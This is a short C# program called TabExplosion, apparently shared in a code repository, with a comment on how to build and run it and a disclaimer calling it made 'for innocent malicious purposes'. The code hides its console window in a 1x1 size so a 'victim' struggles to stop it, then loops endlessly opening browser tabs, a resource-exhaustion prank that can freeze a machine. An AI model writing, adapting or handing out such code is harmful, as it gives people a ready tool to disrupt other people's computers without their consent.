/*To use, clone this repo and go to TabExplosion file, then bin, Debug, and copy the .exe file
or the file named TabExplosion. The file can be executed by clicking on it. I would advise against
opening the file on your own computer. The website that is opened can be changed according to 
user wishes. This file is created for innocent malicious purposes. I am not responsible for whatever
you may choose to do with it.*/

using System;

namespace TabExplosion
{
    class TabIteration
    {
        static void Main(string[] args)
        {
            //Set to make it more difficult to stop iteration by a victim
            Console.SetWindowSize(1,1);

            while(true)
            {
                System.Diagnostics.Process.Start("http://www.google.com");
            }

        }
    }
}
